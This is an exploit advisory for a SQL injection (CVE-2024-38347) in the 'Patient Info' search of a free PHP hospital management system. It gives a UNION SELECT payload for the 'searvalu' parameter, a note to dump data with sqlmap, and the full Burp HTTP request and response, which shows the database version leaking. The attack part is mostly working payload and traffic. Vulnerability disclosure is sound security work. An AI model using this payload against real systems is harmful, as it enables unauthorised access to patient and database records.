# Exploit Title: Health Care hospital Management System - SQL Injection (Authenticated)
# Date: 2024-06-05
# Exploit Author: Sandeep Rajauriya
# Vendor Homepage: https://code-projects.org/health-care-hospital-in-php-css-js-and-mysql-free-download/
# Software Link: https://code-projects.org/health-care-hospital-in-php-css-js-and-mysql-free-download/
# Version: 1.0
# Tested on: Windows 11, PHP 8.2.12, Apache 2.4.58
# CVE: CVE-2024-38347
------------------------------------------------------------------------------------

1. Description:
----------------------

Health Care hospital Management System allows SQL Injection via parameter like "searvalu" in the "Patient Info" module.Exploiting this issue could allow an attacker to compromise the application, access or modify data, 
or exploit latest vulnerabilities in the underlying database.

2. Proof of Concept:
----------------------

In sqlmap use 'searvalu' parameter to dump version of database. 
Then run SQLmap to extract the data from the database:

3. Example payload:
----------------------

'+union+select+@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+

4. Burpsuite HTTP Request on 'searvalu' parameter:
----------------------
POST /HMS/petsearch.php HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/HMS/petsearch.php
Cookie: PHPSESSID=podmt61i233pamo53i63gt78f7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1

searvalu=test'+union+select+@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+&filter=

5. Burpsuite HTTP Response
----------------------
HTTP/1.1 200 OK
Date: Wed, 05 Jun 2024 17:54:07 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 7552
Connection: close
Content-Type: text/html; charset=UTF-8
>
> --REDECATED--
<div style="padding:20px;  margin:5px; border-radius:5px; background-color:rgba(255, 255, 255, 0.3);"class="col-md-5 col-md-push-1">

<h4 style=" color:">
Patient Reg.No : 10.4.32-MariaDB<br />
Patient Name :  <br />
OPD Doctor Registration No : | <a target="_blank" href="admitdf.php?id= " name="ad"> More Information </a>
</h4>

<dl class="dl-horizontal">
<dt style="font-size:12px;"><strong>Birth Day      : </strong></dt>
<dd style="font-size:12px;"></dd>

> --REDECATED--
